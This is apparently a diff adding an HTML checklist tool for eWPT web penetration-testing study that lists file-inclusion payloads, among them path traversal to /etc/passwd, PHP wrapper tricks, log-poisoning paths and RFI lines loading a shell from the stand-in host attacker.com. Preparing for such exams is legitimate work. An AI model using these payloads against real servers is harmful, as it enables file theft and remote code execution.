@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LFI/RFI Checklist - eWPT</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #1a1510; color: #e0e0e0; margin: 20px; }
+        .header-container { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; padding-bottom: 10px; }
+        h2 { color: #ff9800; margin: 0; }
+        table { width: 100%; border-collapse: collapse; background-color: #26201a; margin-top: 20px; table-layout: fixed; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #444; word-wrap: break-word; }
+        th { background-color: #332a22; color: #ff9800; position: sticky; top: 0; }
+        tr:hover { background-color: #3d3228; }
+        .payload-code { font-family: 'Courier New', monospace; color: #ffcc80; background: #1a1510; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; display: block; }
+        button { background-color: #ff9800; color: #000; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; min-width: 80px; }
+        .reset-btn { background-color: #ff5555; color: white; }
+        input[type="text"] { width: 95%; background: #332a22; border: 1px solid #555; color: #fff; padding: 6px; }
+        .checkbox-col { text-align: center; width: 50px; }
+    </style>
+</head>
+<body>
+    <div class="header-container">
+        <h2>📂 LFI/RFI Checklist</h2>
+        <button class="reset-btn" onclick="resetForm()">Clear All</button>
+    </div>
+    <p>Live tool for eWPT. Payloads are Base64 encoded in the source.</p>
+    <table id="payloadTable">
+        <thead>
+            <tr>
+                <th style="width: 30px;">#</th>
+                <th style="width: 35%;">Payload</th>
+                <th style="width: 25%;">Description</th>
+                <th style="width: 100px;">Action</th>
+                <th class="checkbox-col">Done</th>
+                <th>Notes</th>
+            </tr>
+        </thead>
+        <tbody id="tableBody"></tbody>
+    </table>
+    <script>
+        const payloads = [
+            { id: 1, p: '/etc/passwd', d: 'Basic Linux LFI' },
+            { id: 2, p: '../../../../etc/passwd', d: 'Traversal: 4 levels' },
+            { id: 3, p: '..%2f..%2f..%2fetc/passwd', d: 'URL Encoded Traversal' },
+            { id: 4, p: '/etc/passwd%00', d: 'Null Byte Injection (PHP < 5.3)' },
+            { id: 5, p: 'php://filter/convert.base64-encode/resource=config.php', d: 'PHP Wrapper: Source Disclosure' },
+            { id: 6, p: 'php://input', d: 'PHP Wrapper: POST Data Execution' },
+            { id: 7, p: 'C:\\windows\\win.ini', d: 'Basic Windows LFI' },
+            { id: 8, p: '../../../../../../../../../../windows/win.ini', d: 'Windows Deep Traversal' },
+            { id: 9, p: 'http://attacker.com/shell.txt', d: 'Basic RFI' },
+            { id: 10, p: 'http://attacker.com/shell.txt?', d: 'RFI: Neutralize appended extension' },
+            { id: 11, p: '....//....//etc/passwd', d: 'Filter Bypass: ....// to ../' },
+            { id: 12, p: '/proc/self/environ', d: 'Log Poisoning: Check Env variables' },
+            { id: 13, p: '/var/log/apache2/access.log', d: 'Log Poisoning: Apache Access Log' }
+        ];
+
+        const tableBody = document.getElementById('tableBody');
+        payloads.forEach(item => {
+            const b64 = btoa(item.p);
+            const row = document.createElement('tr');
+            row.innerHTML = `<td>${item.id}</td><td><span class="payload-code">${item.p}</span></td><td>${item.d}</td><td><button onclick="copyEncoded('${b64}')">Copy</button></td><td class="checkbox-col"><input type="checkbox" class="task-check"></td><td><input type="text" class="task-note"></td>`;
+            tableBody.appendChild(row);
+        });
+
+        function copyEncoded(b64Data) {
+            navigator.clipboard.writeText(atob(b64Data));
+            const btn = event.target; btn.innerText = 'Copied!'; setTimeout(() => { btn.innerText = 'Copy'; }, 800);
+        }
+
+        function resetForm() { if(confirm("Clear progress?")) { document.querySelectorAll('.task-check').forEach(cb => cb.checked = false); document.querySelectorAll('.task-note').forEach(nt => nt.value = ''); } }
+    </script>
+</body>
+</html>
